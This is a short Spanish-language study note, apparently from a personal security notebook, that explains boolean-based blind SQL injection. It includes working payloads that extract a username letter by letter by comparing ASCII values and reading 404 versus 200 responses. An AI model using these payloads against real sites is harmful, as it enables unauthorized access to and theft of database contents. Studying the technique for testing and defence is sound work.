# Boolean-based Blind SQL Injection

***

* Tags: #OWASP\_TOP\_10 #vulnerabilidad #hacking #sql #exploiting

***

## Definición

> La **Inyección SQL basada en Booleanos** es un tipo de \[\[SQL Injection]] en el que los atacantes manipulan consultas en aplicaciones web para obtener información de la base de datos al evaluar respuestas verdaderas o falsas, lo que puede resultar en acceso no autorizado o robo de datos.

El objetivo principal de esta inyección es intentar deducir caracteres concretos, según la evaluación de una condición.

Insertando algo como lo siguiente, podemos burlar el código, de manera que si obtenemos un código de error 404 significa que la primera palabra no es una a (97 en ascii), por lo que podríamos ir probando con todas las letras hasta encontrar la correcta :

```
#PROBANDO PRIMER CARÁCTER
id=9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=97)   # Error 404
id=9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=98)   # Error 404
id=9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=99)   # 200 Ok => La primera letra es la c

#PROBANDO SEGUNDO CARÁCTER
id=9 or (select(select ascii(substring(username,2,1)) from users where id = 1)=97)   # Error 404
id=9 or (select(select ascii(substring(username,2,1)) from users where id = 1)=97)   # Error 404
...
```

Utilizamos dicho principio para programar en python el script \[\[sqli.py]].
